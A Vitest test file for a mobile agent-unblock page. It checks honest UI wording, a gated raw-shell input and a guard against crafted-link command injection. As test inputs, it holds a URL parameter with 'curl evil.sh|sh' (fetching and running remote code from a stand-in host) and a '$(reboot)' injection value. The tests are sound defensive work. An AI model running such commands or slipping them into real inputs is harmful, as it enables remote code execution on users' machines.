/**
 * Tests for the mobile view copy + safety gate (issue #156).
 *
 * Guards the review-mandated honesty fixes: the UI must NOT claim it approves a
 * running agent, must show the persistent "new session / does not attach"
 * banner, and must keep the raw-shell follow-up field disabled until the user
 * explicitly acknowledges it types into a shell.
 */

import { describe, it, expect, vi, beforeEach } from "vitest";
import { render, screen, fireEvent } from "@testing-library/react";

const { searchParamsRef, useUnblockSessionMock } = vi.hoisted(() => ({
  searchParamsRef: { current: new URLSearchParams("") },
  useUnblockSessionMock: vi.fn((_params: { mode: string }) => ({
    status: "open" as const,
    sessionId: "abcd1234",
    output: "",
    send: vi.fn(() => true),
    reconnect: vi.fn(),
  })),
}));

vi.mock("next/navigation", () => ({
  useSearchParams: () => searchParamsRef.current,
}));

vi.mock("@/hooks/useUnblockSession", () => ({
  useUnblockSession: useUnblockSessionMock,
}));

import MobileUnblockPage from "@/app/m/page";

beforeEach(() => {
  searchParamsRef.current = new URLSearchParams("");
  useUnblockSessionMock.mockClear();
});

describe("mobile unblock page", () => {
  it("does not claim it approves a running agent", () => {
    render(<MobileUnblockPage />);
    expect(screen.queryByText(/unblock agent/i)).toBeNull();
    // The persistent capability banner is present and honest.
    expect(screen.getByRole("alert")).toHaveTextContent(
      /does\s*not\s*yet\s*attach/i,
    );
    expect(screen.getByRole("alert")).toHaveTextContent(/new shell session/i);
  });

  it("keeps the follow-up field disabled until the raw-shell ack is checked", () => {
    render(<MobileUnblockPage />);
    const followUp = screen.getByLabelText(
      /follow-up message to the agent/i,
    ) as HTMLInputElement;
    expect(followUp.disabled).toBe(true);

    const ack = screen.getByLabelText(
      /acknowledge follow-up types into a raw shell/i,
    );
    fireEvent.click(ack);

    expect(followUp.disabled).toBe(false);
  });

  it("ignores command/containerName/cwd from the URL (crafted-link RCE guard)", () => {
    // #156 review HIGH: a crafted /m?command=… link must never reach the
    // terminal WS. The page may pass ONLY an allowlisted `mode`.
    searchParamsRef.current = new URLSearchParams(
      "?command=curl%20evil.sh%7Csh&containerName=daax-pwned&cwd=%2F&mode=local",
    );
    render(<MobileUnblockPage />);

    expect(useUnblockSessionMock).toHaveBeenCalled();
    for (const call of useUnblockSessionMock.mock.calls) {
      expect(call[0]).toEqual({ mode: "local" });
    }
  });

  it("falls back to mode=local for unrecognized mode values", () => {
    searchParamsRef.current = new URLSearchParams("?mode=$(reboot)");
    render(<MobileUnblockPage />);
    expect(useUnblockSessionMock).toHaveBeenCalledWith({ mode: "local" });
  });
});
